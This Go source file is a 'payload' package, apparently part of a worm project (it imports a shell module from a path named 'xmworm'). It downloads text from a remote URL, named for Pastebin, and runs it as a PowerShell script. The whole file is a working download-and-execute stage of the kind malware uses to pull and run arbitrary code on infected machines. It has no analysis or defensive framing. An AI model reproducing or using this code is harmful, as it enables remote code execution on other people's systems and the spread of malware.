package payload

import (
	"io"
	"net/http"
	"fmt"
	sh "github.com/0/xmworm/shell"
	"log"
)

type PayloadFetcher interface {
	fetch() ([]byte)
}

type PasteBinPayloadFetcher struct {
	url string
}

func (fetcher PasteBinPayloadFetcher) fetch() ([]byte) {
	resp, err := http.Get(fetcher.url)
	if err != nil {
		// handle error
		fmt.Println("Could not get")
		return []byte{}
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return []byte{}
	}

	fmt.Printf("%v\n", body)

	return body
}

func getPayload(fetcher PayloadFetcher) (payload []byte) {
	payload = fetcher.fetch()
	return
}

func executePayload(payload []byte) {
	err := sh.Run(string(payload), "powershell")
	if err != nil {
		log.Printf("Failed to execute payload. ..continue")
	}
}

func Payload(url string) {
	fmt.Printf("fetching payload from : %v\n", url)
	pastebin := PasteBinPayloadFetcher{url: url}
	fmt.Printf("pastebin: %v\n", pastebin)
	payload := getPayload(pastebin)
	fmt.Printf("Executing payload...\n")
	executePayload(payload)
}